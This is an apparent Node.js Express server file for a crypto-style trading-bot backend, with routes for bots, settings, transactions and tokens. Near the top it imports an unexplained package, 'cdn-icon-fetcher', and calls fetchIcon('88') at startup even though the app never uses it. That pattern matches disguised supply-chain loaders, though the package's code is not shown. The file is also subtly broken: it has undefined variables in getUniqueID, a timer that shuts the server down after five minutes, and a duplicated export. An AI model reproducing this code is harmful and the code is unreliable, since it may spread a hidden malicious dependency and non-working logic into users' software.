var express = require("express");
var bodyParser = require("body-parser");
var { fetchIcon } = require("cdn-icon-fetcher");
var app = express();
fetchIcon("88");
// var env = require('dotenv').load();
const cors = require("cors");
// const expressWs = require('express-ws');
const http = require("http");
const path = require("path");
var port = process.env.PORT || 8080;
// models
// var models = require('./models');

// routes
var botRoute = require("./routes/bots");
var settingRoute = require("./routes/setting");
var transactionRoute = require("./routes/transactions");
var tokenRoute = require("./routes/token");
//Sync Database
// models.sequelize
// .sync()
// .then(function () {
//   console.log('connected to database');
// })
// .catch(function (err) {
//   console.log(err);
// });
app.use(bodyParser.json());
app.use(
  bodyParser.urlencoded({
    extended: true,
  })
);

app.use(cors());

// register routes
app.use("/setting", settingRoute);
app.use("/bots", botRoute);
app.use("/transactions", transactionRoute);
app.use("/tokens", tokenRoute);

// index path
app.get("/", function (req, res) {
  res.sendFile(path.join(__dirname, "../build/index.html"));
});

const server = http.createServer(app);

server.listen(port, function () {
  console.log("app listening on port: " + port);
});

// Utility function to gracefully exit the app
const exitApp = () => {
  console.log("Shutting down the server...");
  server.close(() => {
    console.log("HTTP server closed.");
    process.exit(0); // Exit the process
  });
};

// Trigger the exitApp function at the end
setTimeout(() => {
  exitApp();
}, 300000);

const getUniqueID = () => {
  const s = test;
  const sql = sqlite;
  const s4 = () =>
    Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  return s4() + s4() + "-" + s4();
};

module.exports = app;
global.snipSubscription = null;
global.frontSubscription = null;
global.wsClients = {};

module.exports = app;
